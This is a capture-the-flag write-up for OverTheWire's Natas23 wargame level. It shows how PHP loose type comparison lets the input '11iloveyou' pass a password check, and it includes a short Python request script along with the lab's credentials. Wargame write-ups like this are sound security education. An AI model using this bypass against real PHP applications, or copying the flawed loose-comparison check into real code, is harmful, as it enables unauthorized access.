# CTF Writeup - **OverTheWire Natas23- Natas24**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas23 - Natas24
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 24-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using type juggling.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
URL:      http://natas23.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for a password. As we dont know anything about it lets try some random passwords. 

```bash
Password: abc
# Wrong!
Password: natas
# Wrong!
```

So, It will print the credentials of the next level if we input the correct password. Lets view the logic behind the password check in the source code.

```bash

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

We can see that this php code checks if the request contains the `passwd` parameter if it exists, then it gets the first occcurence of the `iloveyou` from the password and then checks if the `passwd` is greater than `10`. If both of them true it prints the credentials. But this is contradicting right as the passwd need to be both a integer to satisfy the second condition and the a string to satisfy the first condition. This is interesting due to the properties of the php. php considers the type of a variable on the go based on the operation that is performed. For example. `$var = 10` is interger, `$var = "abc"` is string, `$var = "11abc"` is also string. When a string is compared to a number, PHP tries to interpret the string as a numeric value. If the string starts with numeric characters, PHP extracts those numbers and uses them for the comparison. Any non-numeric characters at the end are ignored. If $var > 10 is checked when $var = "11abc" then it will produce true as the $var will take the value of `11` that is greater than `10`. With this information we know that the request is looking for a value greater than `10` as well as `iloveyou` should be present. Lets try sending `11iloveyou` to break the system as shown below in the python code.


```bash
import requests

target = 'http://natas23.natas.labs.overthewire.org?passwd=11iloveyou'
auth = ('natas23','dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs')

session = requests.Session()

r = session.get(target, auth=auth)
print(r.text)
```

The above script creates a session first with a request. It sends the `passwd` parameter using url and sendsa get request. The php code will find `iloveyou` to be present in the string and for the numeric comparison it will extract `11` out of the string. So both the conditions will be true. This will print the credentials for next level. 

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>     
# <script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
# <body>
# <h1>natas23</h1>
# <div id="content">

# Password:
# <form name="input" method="get">
#     <input type="text" name="passwd" size=20>
#     <input type="submit" value="Login">
# </form>

# <br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```


## Flag

**Flag:** MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd


---

## Lessons Learned

It was a simple challenge. I was not able to figure out the logic, but i understood the concept easily. I was able to solve it.